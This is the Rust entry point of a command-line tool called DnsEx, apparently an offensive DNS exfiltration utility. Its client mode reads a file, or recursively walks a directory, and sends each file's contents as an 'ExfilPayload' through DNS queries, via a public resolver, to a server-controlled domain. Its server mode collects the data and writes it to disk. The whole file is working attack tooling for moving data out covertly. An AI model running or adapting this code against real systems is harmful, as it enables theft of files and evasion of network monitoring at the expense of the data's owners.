use clap::{Parser, Subcommand};
use client::{Client, ClientConfig, ExfilPayload};
use error::DnsexError;
use server::{Server, ServerConfig};
use std::path::Path;
use tokio::fs;
use walkdir::WalkDir;

mod client;
mod error;
mod handler;
mod server;
mod utils;

#[derive(Parser, Debug)]
#[command(author, version, about = "DnsEx - Created by coigner <coigner@tuta.com>", long_about = None)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand, Debug)]
enum Commands {
    Server {
        #[arg(short, long)]
        domain: String,

        #[arg(short, long, default_value = "0.0.0.0")]
        bind: String,

        #[arg(short, long, default_value_t = 8053)]
        port: u16,

        #[arg(short, long, default_value = ".")]
        output: String,
    },

    Client {
        #[arg(short, long)]
        domain: String,

        #[arg(long, default_value = "8.8.8.8")]
        resolver: String,

        #[arg(short, long, default_value_t = 8053)]
        port: u16,

        #[arg(short, long)]
        file: Option<String>,

        #[arg(long, default_value_t = 100)]
        rate_limit: u64,

        #[arg(long)]
        progress: bool,
    },
}

#[tokio::main]
async fn main() -> Result<(), DnsexError> {
    let cli = Cli::parse();

    match cli.command {
        Commands::Server { domain, bind, port, output } => {
            let server_config = ServerConfig {
                domain,
                addr: bind,
                port,
                output,
            };

            let server = Server::new(server_config);
            server.start().await?;
        }

        Commands::Client {
            domain,
            resolver,
            port,
            file,
            rate_limit,
            progress,
        } => {
            let path = match file {
                Some(f) => f,
                None => return Err(DnsexError::ArgumentError("missing input".to_string())),
            };

            let client_config = ClientConfig {
                domain,
                resolver_ip: resolver,
                port,
                rate_limit_ms: rate_limit,
                progress,
            };

            let client = Client::new(client_config);
            let path = Path::new(&path);

            if path.is_dir() {
                for entry in WalkDir::new(path).into_iter().filter_map(|e| e.ok()).filter(|e| e.file_type().is_file()) {
                    let entry_path = entry.path().display().to_string();
                    let bytes = fs::read(&entry_path).await?;
                    let payload = ExfilPayload {
                        filename: entry_path,
                        data: bytes,
                    };

                    let _ = client.send_payload(payload).await?;
                }
            } else {
                let bytes = fs::read(&path).await?;
                let payload = ExfilPayload {
                    filename: path.display().to_string(),
                    data: bytes,
                };

                let _ = client.send_payload(payload).await?;
            };
        }
    };

    Ok(())
}
